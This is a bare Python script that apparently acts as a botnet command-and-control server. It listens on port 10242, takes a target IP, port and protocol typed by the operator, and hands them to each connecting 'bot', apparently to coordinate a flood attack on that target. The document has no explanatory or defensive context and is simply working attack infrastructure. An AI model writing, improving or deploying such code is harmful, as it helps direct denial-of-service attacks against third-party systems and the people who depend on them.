import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket succesfully created')
port = 10242
s.bind(("", port))
print(f'socket binded to port{port}')
s.listen()
print('Socket is listening')
hostname = str("")
hostport = int(0)
proto = str("")
x = True
while True:
    if x == True:
        c, addr = s.accept()
        print(addr, ":Bot connected")
        hostname = input("IP:")
        c.send(hostname.encode())
        print(addr, "Bot Got Hostname/IP")
        c.close()

        hostport = input("Port:")
        c, addr = s.accept()
        c.send(hostport.encode())
        print(addr, "Bot Got Port")
        c.close()

        proto = input("Protocol:")
        c, addr = s.accept()
        c.send(proto.encode())
        print(addr, "Bot Got Protocol")
        c.close()

        x = False
    c, addr = s.accept()
    c.send(hostname.encode())
    print(addr, "Bot Got Hostname/IP")
    c.close()

    c, addr = s.accept()
    c.send(hostport.encode())
    print(addr, "Bot Got Port")
    c.close()

    c, addr = s.accept()
    c.send(proto.encode())
    print(addr, "Bot Got Protocol")
    c.close()


